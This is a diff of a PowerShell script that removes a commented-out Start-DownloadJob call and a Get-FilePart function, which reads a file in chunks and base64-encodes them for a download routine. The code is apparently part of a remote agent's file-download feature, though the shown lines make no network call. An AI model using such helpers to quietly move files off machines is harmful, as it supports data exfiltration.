@@ -530,7 +530,6 @@ function Get-FilePart {
     }
 }
 "@
-#Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
 
     function Start-DownloadJob {
         param($ScriptString, $type, $Path, $ResultID, $ChunkSize)
@@ -679,77 +678,6 @@ function Get-FilePart {
     # get a binary part of a file based on $Index and $ChunkSize
     # and return a base64 encoding of that file part (by default)
     # used by download functionality for large file
-    function Get-FilePart {
-        Param(
-            [string] $File,
-            [int] $Index = 0,
-            $ChunkSize = 512KB,
-            [switch] $NoBase64
-        )
-
-        try {
-            $f = Get-Item "$File"
-            $FileLength = $f.length
-            $FromFile = [io.file]::OpenRead($File)
-
-            if ($FileLength -lt $ChunkSize) {
-                if($Index -eq 0) {
-                    $buff = new-object byte[] $FileLength
-                    $count = $FromFile.Read($buff, 0, $buff.Length)
-                    if($NoBase64) {
-                        $buff
-                    }
-                    else{
-                        [System.Convert]::ToBase64String($buff)
-                    }
-                }
-                else{
-                    $Null
-                }
-            }
-            else{
-                $buff = new-object byte[] $ChunkSize
-                $Start = $Index * $($ChunkSize)
-
-                $null = $FromFile.Seek($Start,0)
-
-                $count = $FromFile.Read($buff, 0, $buff.Length)
-
-                if ($count -gt 0) {
-                    if($count -ne $ChunkSize) {
-                        # if we're on the last file chunk
-
-                        # create a new array of the appropriate length
-                        $buff2 = new-object byte[] $count
-                        # and copy the relevant data into it
-                        [array]::copy($buff, $buff2, $count)
-
-                        if($NoBase64) {
-                            $buff2
-                        }
-                        else{
-                            [System.Convert]::ToBase64String($buff2)
-                        }
-                    }
-                    else{
-                        if($NoBase64) {
-                            $buff
-                        }
-                        else{
-                            [System.Convert]::ToBase64String($buff)
-                        }
-                    }
-                }
-                else{
-                    $Null;
-                }
-            }
-        }
-        catch{}
-        finally {
-            $FromFile.Close()
-        }
-    }
 
 
     ############################################################
